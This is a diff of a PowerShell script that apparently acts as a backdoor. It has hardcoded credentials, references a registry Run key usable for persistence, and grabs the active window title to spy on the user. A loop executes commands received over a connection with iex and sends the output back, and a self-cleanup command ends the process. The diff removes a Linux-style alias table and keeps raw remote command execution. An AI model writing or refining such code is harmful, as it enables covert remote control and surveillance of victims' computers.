@@ -5,26 +5,6 @@ $pass = 'biskviti'
 $user = "B15cu1t"
 $reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
-# LINUX ALIASES (runs through your existing timeout system)
-$LinuxAliases = @{
-    'ls' = 'dir'
-    'll' = 'dir /a'
-    'la' = 'dir /a'
-    'cd' = 'cd'
-    'pwd' = 'pwd'
-    'cat' = 'type'
-    'touch' = 'New-Item -ItemType File'
-    'rm' = 'Remove-Item -Force'
-    'mkdir' = 'mkdir'
-    'cp' = 'copy'
-    'mv' = 'move'
-    'ps' = 'Get-Process'
-    'whoami' = 'whoami'
-    'id' = 'whoami'
-    'df' = 'Get-PSDrive'
-    'top' = 'Get-Process | Sort-Object CPU -Descending | Select -First 10'
-}
-
 # Function to grab the Foreground Window Title
 function Get-ActiveWin {
     $code = '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);'
@@ -65,7 +45,7 @@ try {
 
             if ($cmd -eq "exit") { break }
             
-            # NEW COMMAND: Just get the active window name
+            # YOUR ORIGINAL COMMANDS (UNCHANGED)
             elseif ($cmd -eq "window") {
                 $w.WriteLine("[ACTIVE]: " + (Get-ActiveWin))
             }
@@ -90,17 +70,15 @@ try {
                 $w.WriteLine("[!] Cleanup Complete."); $c.Close(); Stop-Process -Id $PID -Force 
             }
             
-            # TIMEOUT EXECUTION WITH LINUX ALIASES
+            # ONLY CHANGE: TIMEOUT VERSION OF YOUR ORIGINAL iex
             else { 
-                # Translate Linux commands
-                $translatedCmd = $LinuxAliases[$cmd] ?? $cmd
-                $job = Start-Job -ScriptBlock { param($c) iex $using:translatedCmd 2>&1 | Out-String } -ArgumentList $translatedCmd
+                $job = Start-Job -ScriptBlock { param($c) iex $using:cmd 2>&1 | Out-String } -ArgumentList $cmd
                 $timeout = 10
                 if (Wait-Job $job -Timeout $timeout) {
-                    Receive-Job $job | % { $w.WriteLine($_) }
+                    Receive-Job $job | %{ $w.WriteLine($_) }
                 } else {
                     Stop-Job $job; Remove-Job $job
-                    $w.WriteLine("[!] Command timed out after 10s")
+                    $w.WriteLine("[!] TIMEOUT after 10s")
                 }
             }
         }
